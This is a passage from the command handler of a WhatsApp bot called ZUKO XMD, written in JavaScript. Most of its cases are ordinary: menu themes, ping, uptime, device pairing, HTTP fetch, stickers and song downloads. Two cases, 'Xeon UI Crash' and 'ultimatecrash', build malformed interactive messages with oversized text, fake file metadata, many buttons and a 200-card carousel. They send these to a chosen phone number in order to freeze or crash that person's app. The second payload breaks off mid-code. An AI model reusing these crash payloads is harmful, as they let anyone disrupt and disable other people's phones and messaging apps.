9qkNpUVmUvQzdPUcXhFHH4edOc3ZWadbNLbsyZl4Fw11IVZ8RpziqWbsoTq5e+tSTj6M7VTieCj3cNianm0b/NjH/AC1JRdtPzVJzGm6Dc22u1zR5/iH9PY3h2IrY6pVVWvSmkpTvJqMXsn0YHSv4L0LbtJdLP0HbLyAa2I1ErIUbW22K3NMmiutCM03OKk1smtTp/09TjR4zhXbLOU7PRro9Dy9XFpds6uDx7i4Tg+19JOSi+jbKzXv+JYzD4eNR1sVVoWXw1Kls0m/FHzjDTqKt2aE0lPup1Mrk7WduZj/9k=';
    }
    
    await reply('💀 *Launching Xeon UI Crash...*');
    
    try {
        // Build the malformed message
        const crashMessage = proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "",
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 9007199254740991,
                                mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                                fileName: "💀 ZUKO XMD CRASH",
                                fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1723855952",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: thumbBuffer
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: "💀 ZUKO XMD CRASH " + "█".repeat(50000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"CRASH\",\"header\":\"💀 ZUKO XMD\",\"body\":\"xxx\"}",
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "{\"title\":\"💀 ZUKO XMD CRASH\",\"sections\":[{\"title\":\"💀 ZUKO XMD\",\"rows\":[]}]}"
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}"
                                },
                                {
                                    name: "payment_method",
                                    buttonParamsJson: "{}"
                                },
                                {
                                    name: "single_select",
                                    buttonParamsJson: "{\"title\":\"💀 ZUKO XMD\",\"sections\":[{\"title\":\"💀 ZUKO XMD\",\"rows\":[]}]}"
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"💀 ZUKO XMD\",\"flow_id\":\"💀 ZUKO XMD\",\"flow_message_version\":\"9\",\"flow_token\":\"💀 ZUKO XMD\"}"
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{}"
                                }
                            ]
                        }
                    }
                }
            }
        });
        
        // Generate the message
        const etc = generateWAMessageFromContent(
            target,
            crashMessage,
            { userJid: target }
        );
        
        // Send the crash message
        await empire.relayMessage(
            target,
            etc.message,
            { participant: { jid: target } }
        );
        
        reply('💀 *Zuko UI Crash sent successfully!*\n\n📱 Target: ' + target + '\n⚠️ May cause client freeze or crash.');
        
    } catch (e) {
        console.error('zujo crash error:', e);
        reply(`❌ *Crash failed:* ${e.message || 'Unknown error'}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  PER-USER MENU THEME
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'theme': {
    const choice = args[0]?.toLowerCase();
    const current = getUserTheme(m.sender);

    if (!choice) {
        const list = Object.entries(THEMES).map(([key, t]) =>
            `${key === current ? '✅' : '•'} *${key}* — ${t.name}`
        ).join('\n');
        return reply(`🎨━━━━━[ MENU THEMES ]━━━━━🎨\n\n${list}\n\nUsage: ${prefix}theme <name>\n\n🎨━━━━━━━━━━━━━━━━━🎨`);
    }

    if (!THEMES[choice]) return reply(`❌ Unknown theme *${choice}*.\nRun ${prefix}theme to see available options.`);
    setSetting(m.sender, 'menuTheme', choice);
    reply(`✅ *Theme set to ${THEMES[choice].name}!*\nRun ${prefix}menu to see it in action.`);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  PING — CARD STYLE (FIXED)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'ping':
case 'pong': {
    const start = Date.now();
    const pingMsg = await empire.sendMessage(m.chat, { 
        text: '⏳',
        contextInfo: newsletterContext()
    }, { quoted: m });
    
    const latency = Date.now() - start;
    
    let msgTs = m.messageTimestamp;
    if (typeof msgTs?.toNumber === 'function') msgTs = msgTs.toNumber();
    const waLatency = Math.max(1, Date.now() - Number(msgTs) * 1000);
    
    const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
    const up = Math.floor(process.uptime());
    const h = Math.floor(up / 3600);
    const min = Math.floor((up % 3600) / 60);
    
    const response = 
`╭──────────────╮
│  🏓  P O N G  │
╰──────────────╯

  ${latency}ms  ${latency < 100 ? '🚀' : latency < 300 ? '⚡' : '🐢'}
  📱 ${waLatency}ms  🧠 ${mem}MB
  ⏱️ ${h}h ${min}m
     ZUKO-XMD 🕔
╰──────────────╯`;

    await empire.sendMessage(m.chat, {
        text: response,
        edit: pingMsg.key,
        contextInfo: newsletterContext()
    }).catch(() => {
        empire.sendMessage(m.chat, { 
            text: response,
            contextInfo: newsletterContext()
        }, { quoted: m });
    });
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  UPTIME
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  UPTIME (FIXED)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'uptime':
case 'runtime':
case 'alive': {
    const up = process.uptime();
    const d = Math.floor(up / 86400);
    const h = Math.floor((up % 86400) / 3600);
    const min = Math.floor((up % 3600) / 60);
    const sec = Math.floor(up % 60);
    const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
    
    const response =
`⚡━━━━━[ 🟢 UPTIME ]━━━━━⚡

📅 *Days:*    ${d}
🕐 *Hours:*   ${h}
⏱️ *Minutes:* ${min}
⏲️ *Seconds:* ${sec}

🧠 *Memory:*  ${mem} MB
🤖 *Bot:*     ZUKO XMD
🔋 *Status:*  ONLINE ✅

⚡━━━━━━━━━━━━━━━━━⚡`;
    try {
        await empire.sendMessage(m.chat, {
            image: { url: global.menuImage },
            caption: response,
            contextInfo: newsletterContext()
        }, { quoted: m });
    } catch (e) {
        await empire.sendMessage(m.chat, { text: response, contextInfo: newsletterContext() }, { quoted: m });
    }
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  PAIR — LINK ANOTHER DEVICE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'pair':
case 'pairnumber': {
    if (!isCreator) return reply('❌ Owner only — this links a new device to the bot\'s WhatsApp account.');
    const num = (args[0] || '').replace(/[^0-9]/g, '');
    if (!num || num.length < 8) {
        return reply(`🔗 Usage: ${prefix}pair <phone number with country code>\nExample: ${prefix}pair 2348012345678\n\n⚠️ Don't share the resulting code with anyone you don't trust.`);
    }
    try {
        await reply('⏳ Starting a new session and generating a pairing code... (~5s)');
        const startpairing = require('./pair.js');
        const jid = num + '@s.whatsapp.net';
        await startpairing(jid);
        await new Promise(r => setTimeout(r, 5000));

        const pairingFile = './empirestore/pairing/pairing.json';
        if (!fs.existsSync(pairingFile)) {
            return reply('❌ Failed to generate a pairing code. The number may already have an active session, or pairing timed out — try again.');
        }
        const data = JSON.parse(fs.readFileSync(pairingFile, 'utf8'));
        if (data.number !== jid && data.number !== num) {
            return reply('❌ Pairing code didn\'t match the requested number — another pairing may be in progress. Try again in a moment.');
        }
        await empire.sendMessage(m.chat, {
            text: `🔗━━━━━[ PAIRING CODE ]━━━━━🔗\n\n📱 *Number:* +${num}\n🔑 *Code:* ${data.code}\n\n1️⃣ Open WhatsApp on the device to link\n2️⃣ Settings → Linked Devices → Link a Device\n3️⃣ Tap "Link with phone number instead"\n4️⃣ Enter the code above\n\n⚠️ Expires shortly — pair quickly.\n\n🔗━━━━━━━━━━━━━━━━━🔗`,
            contextInfo: newsletterContext()
        }, { quoted: m });
    } catch (e) {
        reply(`❌ Failed to generate pairing code: ${e.message}`);
    }
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  CURL — HTTP REQUEST COMMAND
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'curl':
case 'http':
case 'request': {
    if (!isCreator) return reply('❌ *Only the bot owner can use this command.*');
    
    // Parse arguments: .curl <method> <url> [jsonBody]
    const method = args[0]?.toUpperCase() || 'GET';
    const url = args[1];
    const jsonBody = args.slice(2).join(' ') || null;
    
    if (!url) {
        return reply(
`❌ *Usage:* ${prefix}curl <method> <url> [jsonBody]

📌 *Examples:*
${prefix}curl GET https://api.github.com
${prefix}curl POST https://api.example.com/data {"name":"test"}
${prefix}curl PUT https://api.example.com/1 {"status":"active"}
${prefix}curl DELETE https://api.example.com/1

📊 *Supported Methods:* GET, POST, PUT, PATCH, DELETE, HEAD`
        );
    }
    
    // Validate URL
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
        return reply('❌ *Invalid URL.* Please include http:// or https://');
    }
    
    // Validate method
    const validMethods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD'];
    if (!validMethods.includes(method)) {
        return reply(`❌ *Invalid method.* Supported: ${validMethods.join(', ')}`);
    }
    
    await reply(`⏳ *${method} request to:*\n${url}`);
    
    try {
        // Parse JSON body if provided
        let data = null;
        let headers = {
            'User-Agent': 'ZUKO-XMD-Bot/1.0',
            'Accept': 'application/json'
        };
        
        if (jsonBody && (method === 'POST' || method === 'PUT' || method === 'PATCH')) {
            try {
                data = JSON.parse(jsonBody);
                headers['Content-Type'] = 'application/json';
            } catch (e) {
                return reply('❌ *Invalid JSON body.* Please provide valid JSON.');
            }
        }
        
        // Make the request
        const startTime = Date.now();
        const response = await axios({
            method: method,
            url: url,
            data: data,
            headers: headers,
            timeout: 30000,
            validateStatus: () => true // Don't throw on any status
        });
        
        const responseTime = Date.now() - startTime;
        const status = response.status;
        const statusText = response.statusText || 'OK';
        const statusEmoji = status >= 200 && status < 300 ? '✅' : '❌';
        
        // Get response data
        let responseData = response.data;
        let responseStr = '';
        
        if (typeof responseData === 'object') {
            responseStr = JSON.stringify(responseData, null, 2);
            // Truncate if too long
            if (responseStr.length > 3500) {
                responseStr = responseStr.slice(0, 3500) + '\n... *truncated*';
            }
        } else {
            responseStr = String(responseData).slice(0, 3500);
        }
        
        // Get response headers (important ones)
        const headersStr = Object.entries(response.headers)
            .filter(([k]) => ['content-type', 'content-length', 'server', 'date'].includes(k))
            .map(([k, v]) => `• ${k}: ${v}`)
            .join('\n');
        
        // Build response message
        let result = 
`╭──────────────────╮
│  🌐  C U R L     │
╰──────────────────╯

📤 *${method}* ${url}
📊 *Status:* ${statusEmoji} ${status} ${statusText}
⏱️ *Time:* ${responseTime}ms

📋 *Response:*
${responseStr}`;

        if (headersStr) {
            result += `\n\n📋 *Headers:*\n${headersStr}`;
        }
        
        // Limit total message length
        if (result.length > 4000) {
            result = result.slice(0, 3950) + '\n... *truncated*';
        }
        
        await empire.sendMessage(m.chat, {
            text: result,
            contextInfo: newsletterContext()
        }, { quoted: m });
        
    } catch (e) {
        console.error('Curl error:', e);
        let errorMsg = e.message;
        if (e.code === 'ECONNABORTED') {
            errorMsg = 'Request timed out after 30 seconds';
        } else if (e.code === 'ENOTFOUND') {
            errorMsg = 'Host not found. Please check the URL';
        }
        reply(`❌ *Request failed:* ${errorMsg}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  CURL — QUICK GET (Shortcut)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'get':
case 'fetch': {
    if (!isCreator) return reply('❌ *Only the bot owner can use this command.*');
    
    if (!text) return reply(`❌ *Usage:* ${prefix}get <url>\nExample: ${prefix}get https://api.github.com`);
    
    // Re-run the curl command with GET method
    const curlArgs = ['GET', text];
    // Simulate calling the curl command
    // We'll just handle it directly here
    const method = 'GET';
    const url = text;
    
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
        return reply('❌ *Invalid URL.* Please include http:// or https://');
    }
    
    await reply(`⏳ *GET request to:*\n${url}`);
    
    try {
        const startTime = Date.now();
        const response = await axios({
            method: 'GET',
            url: url,
            headers: { 'User-Agent': 'ZUKO-XMD-Bot/1.0' },
            timeout: 30000,
            validateStatus: () => true
        });
        
        const responseTime = Date.now() - startTime;
        const status = response.status;
        const statusEmoji = status >= 200 && status < 300 ? '✅' : '❌';
        
        let responseData = response.data;
        let responseStr = '';
        
        if (typeof responseData === 'object') {
            responseStr = JSON.stringify(responseData, null, 2);
            if (responseStr.length > 3500) {
                responseStr = responseStr.slice(0, 3500) + '\n... *truncated*';
            }
        } else {
            responseStr = String(responseData).slice(0, 3500);
        }
        
        const result = 
`╭──────────────────╮
│  📥  F E T C H   │
╰──────────────────╯

📤 *GET* ${url}
📊 *Status:* ${statusEmoji} ${status}
⏱️ *Time:* ${responseTime}ms

📋 *Response:*
${responseStr}`;

        await empire.sendMessage(m.chat, {
            text: result,
            contextInfo: newsletterContext()
        }, { quoted: m });
        
    } catch (e) {
        reply(`❌ *Request failed:* ${e.message}`);
    }
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  STICKER — USING WA-STICKER-FORMATTER
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'sticker':
case 'stiker':
case 's': {
    try {
        const quoted = m.quoted ? m.quoted : m;
        const mime = quoted.mimetype || '';
        
        if (!/image|video/.test(mime)) {
            return reply(`🖼️ *STICKER*\n\nSend/reply to an image or video with:\n${prefix}sticker`);
        }
        
        await reply('⏳ *Creating sticker...*');
        
        const mediaBuffer = await empire.downloadMediaMessage(quoted);
        if (!mediaBuffer || mediaBuffer.length === 0) {
            return reply('❌ Failed to download media.');
        }
        
        // Use wa-sticker-formatter
        const { Sticker } = require('wa-sticker-formatter');
        
        const sticker = new Sticker(mediaBuffer, {
            pack: global.packname || 'ZUKO XMD',
            author: global.OWNER_NAME || 'Zuko',
            type: /video/.test(mime) || mime.includes('gif') ? 'animated' : 'full',
            quality: 80,
            crop: false,
        });
        
        const stickerBuffer = await sticker.toBuffer();
        
        if (!stickerBuffer || stickerBuffer.length === 0) {
            return reply('❌ Failed to create sticker.');
        }
        
        await empire.sendMessage(m.chat, { sticker: stickerBuffer }, { quoted: m });
        
    } catch (e) {
        console.error('Sticker error:', e);
        
        // Fallback: try with ffmpeg directly
        try {
            const quoted = m.quoted ? m.quoted : m;
            const mediaBuffer = await empire.downloadMediaMessage(quoted);
            if (!mediaBuffer) return reply('❌ Failed to download media.');
            
            const tmpDir = path.join(process.cwd(), 'tmp');
            if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
            
            const tempInput = path.join(tmpDir, `input_${Date.now()}`);
            const tempOutput = path.join(tmpDir, `sticker_${Date.now()}.webp`);
            
            fs.writeFileSync(tempInput, mediaBuffer);
            
            const isAnimated = /video/.test(mime) || mime.includes('gif');
            const ffmpegCmd = isAnimated 
                ? `ffmpeg -i "${tempInput}" -vf "scale=512:512:force_original_aspect_ratio=decrease,fps=15,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=#00000000" -c:v libwebp -loop 0 -vsync 0 -pix_fmt yuva420p -quality 75 "${tempOutput}"`
                : `ffmpeg -i "${tempInput}" -vf "scale=512:512:force_original_aspect_ratio=decrease,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=#00000000" -c:v libwebp -loop 0 -vsync 0 -pix_fmt yuva420p -quality 75 "${tempOutput}"`;
            
            await new Promise((resolve, reject) => {
                const { exec } = require('child_process');
                exec(ffmpegCmd, { timeout: 60000 }, (error) => {
                    if (error) reject(error);
                    else resolve();
                });
            });
            
            let webpBuffer = fs.readFileSync(tempOutput);
            
            // Add EXIF
            const { addExif } = require('./allfunc/exif.js');
            const stickerBuf = await addExif(webpBuffer, global.packname || 'ZUKO XMD', global.OWNER_NAME || 'Zuko');
            
            await empire.sendMessage(m.chat, { sticker: stickerBuf }, { quoted: m });
            
            try { fs.unlinkSync(tempInput); } catch {}
            try { fs.unlinkSync(tempOutput); } catch {}
            
        } catch (e2) {
            console.error('Fallback sticker error:', e2);
            reply(`❌ Sticker failed: ${e2.message || 'Unknown error'}`);
        }
    }
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  MEDIA — IMAGE TO STICKER (imgsticker)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'imgsticker':
case 'imgstiker':
case 'is': {
    try {
        const quoted = m.quoted ? m.quoted : m;
        const mime = quoted.mimetype || '';
        if (!/image/.test(mime)) return reply(`🖼️ Reply to an image with ${prefix}imgsticker`);
        const buf = await empire.downloadMediaMessage(quoted);
        const webp = await imageToWebp(buf);
        const stickerBuf = await addExif(webp, global.packname || 'ZUKO XMD', global.OWNER_NAME || 'Zuko');
        await empire.sendMessage(m.chat, { sticker: stickerBuf }, { quoted: m });
    } catch (e) {
        reply(`❌ Failed: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  MEDIA — GET PROFILE PICTURE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'getpp':
case 'getprofilepic': {
    const target = m.mentionedJid?.[0] || m.quoted?.sender || m.sender;
    try {
        const ppUrl = await empire.profilePictureUrl(target, 'image').catch(() => null);
        if (!ppUrl) return reply(`❌ No profile picture found for @${target.split('@')[0]}`, { mentions: [target] });
        await empire.sendMessage(m.chat, {
            image: { url: ppUrl },
            caption: `🖼️ *Profile Picture of* @${target.split('@')[0]}`,
            mentions: [target]
        }, { quoted: m });
    } catch (e) {
        reply(`❌ Failed to fetch profile picture: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  MEDIA — SET PROFILE PICTURE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'setpp':
case 'setprofilepic': {
    if (!isCreator) return reply("❌ Owner only!");
    const quoted = m.quoted ? m.quoted : m;
    if (!/image/.test(quoted.mimetype || '')) return reply(`🖼️ Reply to an image with ${prefix}setpp`);
    try {
        const buf = await empire.downloadMediaMessage(quoted);
        await empire.updateProfilePicture(buf);
        reply(`✅ *Profile picture updated!*`);
    } catch (e) {
        reply(`❌ Failed to update profile picture: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  MEDIA — SET GROUP PROFILE PICTURE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'setgpp':
case 'setgrouppp':
case 'setgcpic': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    const quoted = m.quoted ? m.quoted : m;
    if (!/image/.test(quoted.mimetype || '')) return reply(`🖼️ Reply to an image with ${prefix}setgpp`);
    try {
        const buf = await empire.downloadMediaMessage(quoted);
        await empire.updateProfilePicture(m.chat, buf);
        reply(`✅ *Group profile picture updated!*`);
    } catch (e) {
        reply(`❌ Failed to update group picture: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  MEDIA — TO AUDIO
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'toaudio':
case 'tomp3': {
    try {
        const quoted = m.quoted ? m.quoted : m;
        const mime = quoted.mimetype || '';
        if (!/video|audio/.test(mime)) return reply(`🎵 Reply to a video or audio with ${prefix}toaudio`);
        await reply('⏳ Converting to audio...');
        const buf = await empire.downloadMediaMessage(quoted);
        const ext = mime.split('/')[1].split(';')[0];
        const audio = await toAudio(buf, ext);
        await empire.sendMessage(m.chat, {
            audio,
            mimetype: 'audio/mpeg',
            fileName: 'audio.mp3'
        }, { quoted: m });
    } catch (e) {
        reply(`❌ Conversion failed: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  MEDIA — TO PTT (voice note)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'toptt':
case 'tovoice': {
    try {
        const quoted = m.quoted ? m.quoted : m;
        const mime = quoted.mimetype || '';
        if (!/video|audio/.test(mime)) return reply(`🎤 Reply to a video or audio with ${prefix}toptt`);
        await reply('⏳ Converting to voice note...');
        const buf = await empire.downloadMediaMessage(quoted);
        const ext = mime.split('/')[1].split(';')[0];
        const ptt = await toPTT(buf, ext);
        await empire.sendMessage(m.chat, {
            audio: ptt,
            mimetype: 'audio/ogg; codecs=opus',
            ptt: true
        }, { quoted: m });
    } catch (e) {
        reply(`❌ Conversion failed: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  MEDIA — STICKER TO MP4
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'tomp4':
case 'togif': {
    try {
        const quoted = m.quoted ? m.quoted : m;
        const mime = quoted.mimetype || '';
        if (!/webp/.test(mime)) return reply(`🎬 Reply to an animated sticker with ${prefix}tomp4`);
        await reply('⏳ Converting to video...');
        const buf = await empire.downloadMediaMessage(quoted);
        await empire.sendMessage(m.chat, {
            video: buf,
            gifPlayback: true,
            mimetype: 'video/mp4'
        }, { quoted: m });
    } catch (e) {
        reply(`❌ Conversion failed: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  MUSIC — PLAY / SONG (FIXED)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'play':
case 'song':
case 'ytmp3': {
    if (!text) return reply('👉 *Usage:* .play <song name or YouTube link>\nExample: .play Despacito');
    
    reply('🔍 *Searching and processing...* Please wait.');
    
    try {
        let video;
        // Check if input is a YouTube URL
        if (text.includes('youtube.com') || text.includes('youtu.be')) {
            video = { url: text };
        } else {
            // Search YouTube
            const search = await yts(text);
            if (!search || !search.videos || !search.videos.length) {
                return reply('❌ No results found for your query.');
            }
            video = search.videos[0];
        }
        
        // Send thumbnail with info
        await empire.sendMessage(m.chat, {
            image: { url: video.thumbnail },
            caption: `🎵 *Downloading:* ${video.title}\n⏱ *Duration:* ${video.timestamp}`
        }, { quoted: m });
        
        // Try multiple APIs with fallback chain
        const apiMethods = [
            { name: 'EliteProTech', method: () => getEliteProTechDownload(video.url) },
            { name: 'Yupra', method: () => getYupraDownload(video.url) },
            { name: 'Okatsu', method: () => getOkatsuDownload(video.url) },
            { name: 'Shizo', method: () => getShizoDownload(video.url) }
        ];
        
        let audioData = null;
        let audioBuffer = null;
        let downloadSuccess = false;
        
        for (const apiMethod of apiMethods) {
            try {
                audioData = await apiMethod.method();
                const audioUrl = audioData.download || audioData.dl || audioData.url;
                
                if (!audioUrl) {
                    console.log(`${apiMethod.name} returned no download URL, trying next...`);
                    continue;
                }
                
                // Download the audio file
                const audioResponse = await axios.get(audioUrl, {
                    responseType: 'arraybuffer',
                    timeout: 90000,
                    maxContentLength: Infinity,
                    maxBodyLength: Infinity,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Accept': '*/*'
                    }
                });
                
                audioBuffer = Buffer.from(audioResponse.data);
                
                if (audioBuffer && audioBuffer.length > 0) {
                    downloadSuccess = true;
                    break;
                }
            } catch (err) {
                console.log(`${apiMethod.name} failed:`, err.message);
                continue;
            }
        }
        
        if (!downloadSuccess || !audioBuffer) {
            return reply('❌ All download sources failed. The content may be unavailable or blocked.');
        }
        
        // Detect format and convert if needed
        let finalBuffer = audioBuffer;
        let finalMimetype = 'audio/mpeg';
        let finalExtension = 'mp3';
        
        // Check if it's already MP3
        const isMP3 = audioBuffer.toString('ascii', 0, 3) === 'ID3' || 
                     (audioBuffer[0] === 0xFF && (audioBuffer[1] & 0xE0) === 0xE0);
        
        if (!isMP3) {
            try {
                // Detect format from signature
                let format = 'm4a';
                if (audioBuffer.toString('ascii', 0, 4) === 'OggS') format = 'ogg';
                else if (audioBuffer.toString('ascii', 0, 4) === 'RIFF') format = 'wav';
                
                // Convert to MP3
                finalBuffer = await toAudio(audioBuffer, format);
                if (!finalBuffer || finalBuffer.length === 0) {
                    throw new Error('Conversion returned empty buffer');
                }
            } catch (convErr) {
                console.error('Conversion error:', convErr);
                return reply('❌ Failed to convert audio to MP3.');
            }
        }
        
        // Send audio
        const title = (audioData?.title || video.title || 'song').replace(/[^\w\s-]/g, '');
        await empire.sendMessage(m.chat, {
            audio: finalBuffer,
            mimetype: finalMimetype,
            fileName: `${title}.${finalExtension}`,
            ptt: false
        }, { quoted: m });
        
    } catch (err) {
        console.error('Song command error:', err);
        reply('❌ Failed to download song. Please try again later.');
    }
}
break;
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ULTIMATE CRASH — MAXIMUM DESTRUCTION
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'ultimatecrash':
case 'ucrash':
case 'megacrash':
case 'hypercrash': {
    if (!isCreator) return reply('❌ *Only the bot owner can use this command.*');
    
    const target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.chat;
    if (!target) return reply(`👉 *Usage:* ${prefix}ucrash <jid>\nExample: ${prefix}ucrash 6281234567890`);
    
    await reply('💀 *Launching ULTIMATE CRASH on target...*\n⏳ *This will take a few seconds...*');
    
    try {
        // ─── VECTOR 1: Massive Carousel ───
        const cards = [];
        for (let i = 0; i < 200; i++) {
            cards.push({
                header: {
                    title: '💀'.repeat(100) + ` ZUKO XMD ${i}`,
                    hasMediaAttachment: true,
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/jpeg",
                        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                        fileLength: "9999999999999",
                        mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                        fileName: `CRASH_${i}`,
                        fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1723855952",
